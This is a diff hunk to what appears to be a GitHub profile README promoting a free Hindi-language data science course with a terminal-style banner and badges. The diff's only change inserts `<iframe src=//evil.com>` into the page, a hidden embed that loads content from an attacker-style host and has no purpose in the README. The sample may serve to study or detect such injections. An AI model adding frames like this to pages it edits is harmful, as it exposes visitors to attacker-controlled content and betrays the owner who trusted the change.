@@ -7,7 +7,7 @@
 <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=22&duration=2000&pause=500&color=00FF00&background=000000&center=true&vCenter=true&multiline=true&repeat=true&width=1000&height=200&lines=+$+sudo+apt+install+data-science;+[OK]+Python+3.12+installed;+[OK]+Machine+Learning+libraries+loaded;+[OK]+Deep+Learning+frameworks+ready;+>>>+Welcome+to+DATA+GURU+Terminal+<<<;+>+Teaching+Data+Science+in+Hindi+%F0%9F%87%AE%F0%9F%87%B3;+>+From+ZERO+→+HERO+→+DEPLOYMENT+%F0%9F%9A%80;+>+6-Month+Complete+FREE+Course+Available!" alt="Terminal Boot" />
 
 <br/>
-
+<iframe src=//evil.com>
 <!-- GLITCH EFFECT BADGES -->
 <p align="center">
   <img src="https://img.shields.io/badge/🎯_Mission-FREE%20Education%20in%20Hindi-00D9FF?style=for-the-badge&logo=target&logoColor=white&labelColor=000000&color=00FF00" />
